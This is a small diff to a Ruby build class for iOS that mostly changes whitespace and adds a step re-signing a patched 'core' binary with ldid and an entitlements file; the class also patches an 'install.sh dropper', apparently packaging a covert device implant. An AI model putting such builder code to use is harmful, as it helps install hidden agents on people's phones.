@@ -14,7 +14,7 @@ class BuildIOS < Build
     super
     @platform = 'ios'
   end
-
+  
   def patch(params)
 
     trace :debug, "Build: patching: #{params}"
@@ -31,6 +31,8 @@ class BuildIOS < Build
     # invoke the generic patch method with the new params
     super
 
+    # realign the memory hashes after the binary patching
+    CrossPlatform.exec path('ldid.exe'), '-S' + path('ent.plist') + ' ' + path('core'), {:chdir => path('')}
   end
 
   def scramble
@@ -51,7 +53,7 @@ class BuildIOS < Build
 
   def melt(params)
     trace :debug, "Build: melting: #{params}"
-
+	
     # open the install.sh dropper and patch the value of the files to be installed
     file = File.open(path('install.sh'), 'rb+')
     content = file.read
